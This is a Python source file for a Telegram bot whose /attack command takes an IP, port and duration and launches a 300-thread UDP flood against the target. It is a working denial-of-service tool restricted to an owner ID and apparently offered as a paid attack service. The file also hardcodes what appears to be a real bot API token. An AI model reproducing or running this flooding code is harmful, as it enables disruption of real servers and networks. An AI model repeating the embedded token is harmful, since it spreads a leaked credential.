import socket
import time
import asyncio
import random
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# 👑 Owner ID aur Token
BOT_TOKEN = "7744875151:AAF8P1vSd8awHrmaGmWQiI6d-S_fgoPvLkY"
OWNER_ID = 5470646229  # Sirf aap hi use kar paoge

# /start command with button
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("👤 CONNECT OWNER", url="https://t.me/VIP_OWNER9")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Welcome Pawan Bhai! Use: /attack <ip> <port> <seconds>",
        reply_markup=reply_markup
    )

# ✅ High-Speed UDP Attack Function
def send_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            for _ in range(1000):  # 1000 packets per loop
                sock.sendto(data, (ip, port))
        except:
            continue
    sock.close()

# 🔥 Powerful Multi-thread Attack
def start_attack(ip, port, duration, threads=300):
    print(f"🔥 Attacking {ip}:{port} for {duration}s with {threads} threads.")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_flood, args=(ip, port, duration))
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("✅ Attack complete.")

# /attack command
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Unauthorized. Contact @VIP_OWNER9")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>")
        return

    ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return

    await update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration} seconds with 🔥 HIGH POWER")

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, start_attack, ip, port, duration)

    await update.message.reply_text("✅ Attack Finished. Check the target status.")

# Run bot
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.run_polling()
        
